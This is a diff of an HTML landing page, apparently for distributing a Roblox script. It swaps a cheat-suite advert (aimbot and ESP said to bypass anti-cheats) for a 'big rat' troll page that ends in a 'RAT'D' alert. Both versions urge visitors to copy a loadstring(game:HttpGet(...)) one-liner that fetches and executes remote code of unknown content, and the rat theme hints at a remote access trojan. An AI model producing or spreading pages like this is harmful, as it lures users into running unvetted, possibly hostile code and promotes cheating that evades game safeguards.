@@ -3,71 +3,122 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sync.xyz | Elite Scripting</title>
+    <title>big rat</title>
     <script src="https://cdn.tailwindcss.com"></script>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;500;700&display=swap');
-        body { background-color: #050505; font-family: 'Space+Grotesk', sans-serif; color: white; overflow-x: hidden; }
-        .glow { box-shadow: 0 0 20px rgba(10, 59, 255, 0.4); }
-        .gradient-text { background: linear-gradient(90deg, #4f46e5, #0a3bff); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
-        .hero-bg { background: radial-gradient(circle at center, #0a3bff22 0%, transparent 70%); }
+        @import url('https://fonts.googleapis.com/css2?family=Courier+Prime:wght@700&display=swap');
+        
+        body { 
+            background-color: #000; 
+            font-family: 'Courier Prime', monospace; 
+            color: #0f0; 
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            overflow: hidden;
+        }
+
+        .rat-container {
+            position: relative;
+            margin-bottom: 2rem;
+        }
+
+        .big-rat {
+            width: 400px;
+            max-width: 80vw;
+            animation: rat-spin 4s infinite linear, rat-shake 0.1s infinite;
+            filter: drop-shadow(0 0 30px #0f0);
+        }
+
+        @keyframes rat-spin {
+            from { transform: rotate(0deg); }
+            to { transform: rotate(360deg); }
+        }
+
+        @keyframes rat-shake {
+            0% { translate: 2px 2px; }
+            50% { translate: -2px -2px; }
+            100% { translate: 2px -2px; }
+        }
+
+        .copy-box {
+            background: #111;
+            border: 2px solid #0f0;
+            padding: 1rem;
+            border-radius: 4px;
+            font-size: 0.8rem;
+            margin-bottom: 1.5rem;
+            max-width: 90vw;
+            overflow-x: auto;
+            white-space: nowrap;
+        }
+
+        .troll-btn {
+            background: #0f0;
+            color: #000;
+            padding: 20px 40px;
+            font-size: 1.5rem;
+            font-weight: 900;
+            border: none;
+            cursor: pointer;
+            text-transform: uppercase;
+            box-shadow: 0 0 20px #0f0;
+        }
+
+        .troll-btn:active {
+            transform: scale(0.9);
+            background: #fff;
+        }
+
+        .discord-btn {
+            margin-top: 30px;
+            color: #5865F2;
+            text-decoration: none;
+            font-size: 1.2rem;
+            border: 1px solid #5865F2;
+            padding: 8px 16px;
+        }
+
+        .discord-btn:hover {
+            background: #5865F2;
+            color: #fff;
+        }
+
+        #status-text {
+            margin-top: 10px;
+            font-size: 0.9rem;
+            height: 20px;
+        }
     </style>
 </head>
 <body>
 
-    <nav class="flex justify-between items-center p-6 max-w-7xl mx-auto">
-        <div class="text-2xl font-bold tracking-tighter">SYNC<span class="text-blue-600">.XYZ</span></div>
-        <div class="space-x-8 hidden md:flex text-sm uppercase tracking-widest opacity-70">
-            <a href="#" class="hover:text-blue-500 transition">Features</a>
-            <a href="#" class="hover:text-blue-500 transition">Showcase</a>
-            <a href="#" class="hover:text-blue-500 transition">Status</a>
-        </div>
-        <button class="bg-blue-600 px-6 py-2 rounded-full font-bold hover:bg-blue-700 transition glow">GET KEY</button>
-    </nav>
+    <h1 style="font-size: 3rem; margin-bottom: 20px;">big rat</h1>
 
-    <main class="relative flex flex-col items-center justify-center min-h-[80vh] text-center px-4 hero-bg">
-        <div id="hero-content">
-            <h1 class="text-6xl md:text-8xl font-bold mb-6 tracking-tighter">
-                UNLEASH <br> <span class="gradient-text">POLARIZED V7</span>
-            </h1>
-            <p class="text-gray-400 max-w-lg mx-auto mb-10 text-lg">
-                The most advanced combat suite ever created. Engineered for performance, designed for dominance.
-            </p>
-            
-            <div class="flex flex-col md:flex-row gap-4 justify-center">
-                <div class="bg-zinc-900 border border-zinc-800 p-1 rounded-xl flex items-center">
-                    <code class="px-4 text-blue-400 text-sm" id="script-path">
-                        loadstring(game:HttpGet("https://undetectedscriptlol.vercel.app/api/v7"))()
-                    </code>
-                    <button onclick="copyScript()" class="bg-zinc-800 p-3 rounded-lg hover:bg-zinc-700 transition">
-                        <i class="fa-regular fa-copy" id="copy-icon"></i>
-                    </button>
-                </div>
-            </div>
-        </div>
-    </main>
+    <div class="rat-container">
+        <img src="https://cdn.jsdelivr.net/gh/twitter/twemoji/assets/svg/1f400.svg" class="big-rat" alt="RAT">
+    </div>
 
-    <section class="max-w-6xl mx-auto py-20 px-6 grid md:grid-cols-3 gap-8">
-        <div class="bg-zinc-900/50 border border-zinc-800 p-8 rounded-2xl hover:border-blue-500/50 transition group">
-            <i class="fa-solid fa-crosshairs text-3xl text-blue-600 mb-4"></i>
-            <h3 class="text-xl font-bold mb-2">Adaptive Aimbot</h3>
-            <p class="text-zinc-500 text-sm">Silent aim and smoothness prediction that bypasses standard anti-cheats.</p>
-        </div>
-        <div class="bg-zinc-900/50 border border-zinc-800 p-8 rounded-2xl hover:border-blue-500/50 transition">
-            <i class="fa-solid fa-eye text-3xl text-blue-600 mb-4"></i>
-            <h3 class="text-xl font-bold mb-2">Enhanced ESP</h3>
-            <p class="text-zinc-500 text-sm">Skeleton, Tracers, and Health bars with 0 frame-rate drop.</p>
-        </div>
-        <div class="bg-zinc-900/50 border border-zinc-800 p-8 rounded-2xl hover:border-blue-500/50 transition">
-            <i class="fa-solid fa-bolt text-3xl text-blue-600 mb-4"></i>
-            <h3 class="text-xl font-bold mb-2">Executor Only</h3>
-            <p class="text-zinc-500 text-sm">Advanced source protection. Site access restricted to valid clients.</p>
-        </div>
-    </section>
+    <div class="copy-box">
+        <code id="script-path">loadstring(game:HttpGet("https://undetectedscriptlol.vercel.app/api/v7"))()</code>
+    </div>
+
+    <button class="troll-btn" onclick="copyScript()">
+        COPY SCRIPT
+    </button>
+
+    <p id="status-text"></p>
+
+    <a href="https://discord.gg/xmGsMdAeTQ" target="_blank" class="discord-btn">
+        join the rat den
+    </a>
 
     <script>
-        // Automatically set the URL based on current hosting
+        // Set dynamic URL
         const scriptUrl = `loadstring(game:HttpGet("https://${window.location.host}/api/v7"))()`;
         document.getElementById('script-path').innerText = scriptUrl;
 
@@ -75,17 +126,15 @@
             const text = document.getElementById('script-path').innerText;
             navigator.clipboard.writeText(text);
             
-            const icon = document.getElementById('copy-icon');
-            icon.classList.remove('fa-copy');
-            icon.classList.add('fa-check');
-            icon.style.color = '#10b981';
+            const status = document.getElementById('status-text');
+            status.innerText = "COPIED TO CLIPBOARD 🐀";
             
-            setTimeout(() => {
-                icon.classList.remove('fa-check');
-                icon.classList.add('fa-copy');
-                icon.style.color = '';
-            }, 2000);
+            // Random chance for an alert
+            if(Math.random() > 0.5) {
+                alert("RAT'D");
+            }
         }
     </script>
+
 </body>
 </html>
